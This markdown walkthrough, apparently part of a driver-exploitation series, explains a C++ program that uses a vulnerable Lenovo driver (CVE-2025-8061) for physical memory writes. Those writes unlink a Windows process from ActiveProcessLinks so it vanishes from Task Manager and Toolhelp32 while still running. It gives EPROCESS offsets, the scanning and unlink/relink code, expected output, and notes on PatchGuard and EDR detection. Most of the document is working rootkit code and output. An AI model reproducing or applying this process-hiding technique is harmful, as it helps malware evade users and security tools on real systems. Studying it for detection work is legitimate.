# 06 — DKOM Process Hiding (ActiveProcessLinks Unlink)

**File:** `06_dkom_hide.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical read/write + Page table walk  
**Output:** Process runs normally but is invisible to Task Manager, Process Explorer, and Toolhelp32

---

## Objective

Unlink an EPROCESS from the `ActiveProcessLinks` list in the kernel. Result: every user-mode API that enumerates processes (Task Manager, `EnumProcesses`, `CreateToolhelp32Snapshot`, `NtQuerySystemInformation class 5`) will not see the process — but the process continues running normally.

---

## Background Theory

### ActiveProcessLinks — Doubly Linked List

Every EPROCESS has a `LIST_ENTRY` at offset `+0x448`:

```
struct LIST_ENTRY {
    LIST_ENTRY *Flink;  // +0x448: points to the NEXT EPROCESS's links
    LIST_ENTRY *Blink;  // +0x450: points to the PREV EPROCESS's links
};
```

This is a **circular doubly linked list** — the System process (PID 4) is the head, with all other processes linked in sequence. When the kernel enumerates processes, it walks this list starting from `PsActiveProcessHead`.

**Important**: Flink/Blink values are VAs (Virtual Addresses) pointing to `EPROCESS+0x448` of the adjacent process, NOT to the start of the EPROCESS.

### Unlink Operation

```
Before:
  prev_links ←→ target_links ←→ next_links

After unlink:
  prev_links ←→ next_links
  (target_links still holds its old Flink/Blink; nothing points to it anymore)
```

Specifically:
```
prev->Flink = target->Flink   (skip target going forward)
next->Blink = target->Blink   (skip target going backward)
```

### Does PatchGuard Check ActiveProcessLinks?

On **Windows 10+ (19041 and later)**: **NO**. Microsoft decided not to protect APL because too much legitimate software (monitoring tools, security products) also modifies it. This is why the DKOM technique is **stable** on modern Windows.

(Unlike the PPL Protection byte and g_CiOptions — those are checked by PG.)

---

## Line-by-Line Code Explanation

### DkomSave Struct

```cpp
struct DkomSave {
    uint64_t target_links_va; // VA of target->ActiveProcessLinks (+0x448)
    uint64_t flink_va;        // original Flink: VA of next's links
    uint64_t blink_va;        // original Blink: VA of prev's links
};
```

Saves state for restore.

### FindEprocByPid() — Enhanced Validation

```cpp
for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
    // Check PID
    if (*(ULONG_PTR*)(buf+off+0x440) != pid) continue;
    // Check name
    if (_strnicmp((char*)(buf+off+0x5A8), stem, slen) != 0) continue;
    
    // Extra validation: Flink and Blink must be valid kernel VAs
    uint64_t fl = *(uint64_t*)(buf+off+0x448);
    uint64_t bl = *(uint64_t*)(buf+off+0x450);
    if ((fl >> 48) != 0xFFFF || (bl >> 48) != 0xFFFF) continue;
    // Canonical kernel VA: bits [63:48] = 0xFFFF
    
    // Flink != Blink: a process should not be a singleton node
    if (fl == bl) continue;
    
    found_pa = pa + off;
```

The extra Flink/Blink validity checks significantly reduce false positives. Garbage data masquerading as an EPROCESS will not have Flink/Blink values in the kernel VA range.

### HideProcess() — Detailed Unlink Logic

```cpp
static bool HideProcess(uint64_t cr3, uint64_t eproc_pa, DkomSave *s)
{
    // Step 1: read Flink and Blink of the target from physical memory
    PhysReadU64(eproc_pa + 0x448, &s->flink_va);  // → next's links VA
    PhysReadU64(eproc_pa + 0x450, &s->blink_va);  // → prev's links VA
    
    printf("    Flink = 0x%016llX  (→ next's links)\n", s->flink_va);
    printf("    Blink = 0x%016llX  (→ prev's links)\n", s->blink_va);
```

Note: `eproc_pa + 0x448` is the physical address of the Flink field. `eproc_pa + 0x450` is Blink (`0x448 + 8` because LIST_ENTRY = 2 × UINT64).

```cpp
    // Step 2: obtain the VA of the target's own links
    // next->Blink points BACK to target's links
    // → reading next->Blink gives us target_links_va
    
    uint64_t next_blink_pa = VaToPa(cr3, s->flink_va + 8);
    // s->flink_va = VA of next's Flink
    // s->flink_va + 8 = VA of next's Blink
    // VaToPa translates to PA for physical reading
    
    PhysReadU64(next_blink_pa, &s->target_links_va);
    // = VA of target's LIST_ENTRY (target_eproc_va + 0x448)
```

Why do we need `target_links_va`? To restore the list later, we need to know the VA of the target's links so we can point prev and next back to it.

```cpp
    // Step 3: unlink
    // prev->Flink = next's links (skip target)
    uint64_t prev_flink_pa = VaToPa(cr3, s->blink_va);
    // s->blink_va = VA of prev's Flink field (prev's LIST_ENTRY start = prev_links.Flink)
    
    uint64_t next_blink_pa2 = VaToPa(cr3, s->flink_va + 8);
    // s->flink_va + 8 = VA of next's Blink field
    
    PhysWriteU64(prev_flink_pa,  s->flink_va);  // prev->Flink = next's links
    PhysWriteU64(next_blink_pa2, s->blink_va);  // next->Blink = prev's links
    
    return true;
```

After these two writes, `prev` and `next` link directly to each other, bypassing `target`. A kernel list walk will no longer encounter `target`.

### IsVisible() — Check via Toolhelp32

```cpp
static bool IsVisible(DWORD pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32First(snap, &pe)) {
        do { if (pe.th32ProcessID == pid) { found = true; break; } }
        while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}
```

`CreateToolhelp32Snapshot` → kernel calls `NtQuerySystemInformation(SystemProcessInformation)` → kernel walks `ActiveProcessLinks`. After unlinking, the kernel walk skips the target → `found = false`.

### Demo: Process Is Still Alive While Hidden

```cpp
// Process is still running even though it no longer appears in the list
HANDLE prove = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
printf("OpenProcess(%lu) = %s  ← hidden but STILL RUNNING\n",
       target_pid,
       prove ? "SUCCESS" : "FAILED (may have exited)");
```

`OpenProcess` uses a direct PID lookup (not an APL walk) → a handle can still be opened. This proves the process is alive.

### UnhideProcess() — Re-link

```cpp
static bool UnhideProcess(uint64_t cr3, uint64_t eproc_pa, const DkomSave &s)
{
    // Restore target's own Flink/Blink (explicit, even if they were not cleared)
    PhysWriteU64(eproc_pa + 0x448, s.flink_va);  // target->Flink = next
    PhysWriteU64(eproc_pa + 0x450, s.blink_va);  // target->Blink = prev
    
    // Point prev and next back to target
    uint64_t prev_flink_pa = VaToPa(cr3, s.blink_va);      // prev's Flink field
    uint64_t next_blink_pa = VaToPa(cr3, s.flink_va + 8);  // next's Blink field
    
    PhysWriteU64(prev_flink_pa, s.target_links_va);  // prev->Flink = target's links
    PhysWriteU64(next_blink_pa, s.target_links_va);  // next->Blink = target's links
    
    return true;
}
```

4 writes: 2 restore the target's internal list state, 2 point prev/next back to the target. The list is fully intact afterward.

### Main Flow with Notepad Demo

```cpp
if (argc >= 2) {
    target_pid = (DWORD)atoi(argv[1]);  // user-supplied PID
} else {
    // Spawn notepad for the demo
    STARTUPINFOA si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    CreateProcessA(nullptr, (LPSTR)"notepad.exe", ...);
    target_pid = pi.dwProcessId;
    Sleep(600);  // wait for notepad to finish initializing (load DLLs, create window)
```

---

## Expected Output

```
[*] Toolhelp32 snapshot BEFORE hide:
    PID 1234   visible = YES [confirmed]

[*] Unlinking from ActiveProcessLinks...
    Flink = 0xFFFF88012345448  (→ next's links)
    Blink = 0xFFFF88087654448  (→ prev's links)
[+] UNLINKED

[*] Toolhelp32 snapshot AFTER hide:
    PID 1234   visible = NO  ← HIDDEN
    OpenProcess(1234) = SUCCESS  ← hidden but STILL RUNNING

[*] Re-linking EPROCESS...
[+] RE-LINKED

[*] Toolhelp32 snapshot AFTER restore:
    PID 1234   visible = YES [restored]
```

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | **Does not check APL on Win10+** — stable |
| Process exits while hidden | The kernel may have issues when an EPROCESS is freed while unlinked. In the demo we restore before terminating |
| NtQuerySystemInformation | This is the only thing that is blind — handle lookup and callback lookup still work |
| EDR detection | Some EDR products detect this by comparing the APL list against the callback list — if a callback exists for process X but X is not in the APL → alert |

---

## Flow Summary

```
Spawn notepad.exe → target_pid = 1234

IsVisible(1234) = TRUE ✓ (before)

GetSystemCR3() → cr3
FindEprocByPid(1234, "notepad") → eproc_pa = 0xPA...

HideProcess(cr3, eproc_pa):
    read Flink, Blink
    prev->Flink = Flink
    next->Blink = Blink
    → list bypasses target

IsVisible(1234) = FALSE ✓ (hidden!)
OpenProcess(1234) = SUCCESS ✓ (still alive!)

UnhideProcess(cr3, eproc_pa):
    restore target->Flink, target->Blink
    prev->Flink = target_links_va
    next->Blink = target_links_va

IsVisible(1234) = TRUE ✓ (restored)
```
